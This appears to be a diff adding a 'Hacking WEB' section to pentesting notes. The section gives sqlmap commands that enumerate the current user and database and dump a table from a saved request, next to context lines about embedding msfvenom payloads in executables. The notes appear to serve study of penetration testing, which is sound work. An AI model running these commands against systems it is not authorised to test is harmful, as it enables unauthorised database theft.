@@ -251,3 +251,18 @@ msfvenom --info format #To see the formats
 With msfvenom or lordpe, we can create a legitimate executable with a payload.
 
 Codecabin&#x20;
+
+## Hacking WEB
+
+### sqlmap
+
+To work with sqlmap is always better to detect the vulnerable request and send it later to the sqlmap commnad line.
+
+In order to be able to excute different applications using only the name without specifying the route we need to edit the PATH and the ENV.
+
+```bash
+sqlmap -r <FICHERO> --level=5 --risk=3 --current-user
+sqlmap -r <FICHERO> --level=5 --risk=3 --current-db
+sqlmap -r <FICHERO> --level=5 --risk=3 -D <nombre_db> -T <tabla> --dump
+```
+
